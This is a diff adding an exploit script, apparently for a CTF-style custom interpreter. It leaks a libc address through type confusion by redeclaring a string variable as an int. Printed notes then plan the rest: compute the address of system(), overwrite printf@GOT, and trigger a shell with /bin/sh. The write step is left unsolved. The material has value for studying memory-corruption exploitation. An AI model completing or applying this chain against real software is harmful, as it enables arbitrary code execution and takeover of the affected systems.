@@ -1,0 +1,30 @@
+print("=== RCE Exploit with Libc Leak ===");
+
+print("Step 1: Leak libc address via type confusion");
+string v2 = "BBBBBBBB";
+int v2 = 4231312;
+int leaked = length(v2);
+print("Leaked libc address:");
+print(leaked);
+
+print("Step 2: Calculate system address");
+print("leaked_addr = 0x7ca596e88550 (setvbuf or similar)");
+print("Need setvbuf offset to calculate libc_base");
+print("libc_base = leaked_addr - setvbuf_offset");
+print("system_addr = libc_base + 0x58750");
+print("Note: Calculation needs to be done in Python wrapper");
+
+print("Step 3: Write system() to printf@GOT");
+print("printf@GOT = 0x409048");
+print("Need to write system_addr to this address");
+print("Options:");
+print("  1. Use bitmap overflow (need addresses)");
+print("  2. Use use-after-free (more reliable)");
+print("  3. Find another write primitive");
+
+print("Step 4: Trigger shell");
+print("print with /bin/sh");
+print("Calls system which gives shell");
+
+print("Note: We have libc leak, now need write primitive!");
+
